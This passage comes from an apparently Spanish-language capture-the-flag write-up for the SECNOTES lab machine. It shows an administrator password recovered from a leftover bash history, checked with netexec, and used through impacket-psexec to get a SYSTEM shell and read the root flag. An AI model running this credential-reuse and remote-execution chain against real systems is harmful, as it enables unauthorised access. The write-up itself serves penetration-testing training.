+mesg: ttyname failed: Inappropriate ioctl for device
+whoami
+root
+</code></pre></div></div>
+<ul>
+<li>Estamos en un subsistema de Linux.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.129.16.60  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::894e:ce14:b55a:ecc7  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 dead:beef::755f:fc10:dbb7:b88e  prefixlen 128  scopeid 0x0&lt;global&gt;
+        inet6 fe80::894e:ce14:b55a:ecc7  prefixlen 64  scopeid 0x0&lt;global&gt;
+        ether 00:50:56:b0:55:b5  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 1500
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x0&lt;global&gt;
+        loop  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+cd /
+ls
+bin
+boot
+dev
+etc
+home
+init
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+</code></pre></div></div>
+<ul>
+<li>Podemos ver el bash_history ya que no es un enlace simbólico al /dev/null.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">ls -la
+total 8
+drwx------ 1 root root  512 Jun 22  2018 .
+drwxr-xr-x 1 root root  512 Jun 21  2018 ..
+---------- 1 root root  398 Jun 22  2018 .bash_history
+-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
+cat .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+&gt; .bash_history 
+less .bash_history
+exit
+</code></pre></div></div>
+<ul>
+<li>Vamos a validar la contraseña que nos muestra que al parecer es del usuario administrador.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ netexec smb 10.129.16.60 -u 'administrator' -p 'u6!4ZwgwOM#^OBf#Nwnh'
+SMB         10.129.16.60    445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
+SMB         10.129.16.60    445    SECNOTES         [+] SECNOTES\administrator:u6!4ZwgwOM#^OBf#Nwnh (Pwn3d!)
+</code></pre></div></div>
+<h2 id="shell-as-administrator-and-root-flag">Shell as administrator and root flag</h2>
+<ul>
+<li>Bueno pues ya nos podemos conectar una escalada muy básica.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-psexec WORKGROUP/Administrator@10.129.16.60
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.129.16.60.....
+[*] Found writable share ADMIN$
+[*] Uploading file sIQjmUnh.exe
+[*] Opening SVCManager on 10.129.16.60.....
+[*] Creating service TCHU on 10.129.16.60.....
+[*] Starting service TCHU.....
+[!] Press help for extra shell commands                                            Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt; whoami                                                        nt authority\system
+</code></pre></div></div>
+<ul>
+<li>Vemos la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\WINDOWS\system32&gt; type C:\Users\Administrator\Desktop\root.txt                  c91f47b28dbeca9242eb0cc707692732
+c91f47b28dbeca9242eb0cc707692732
+C:\WINDOWS\system32&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
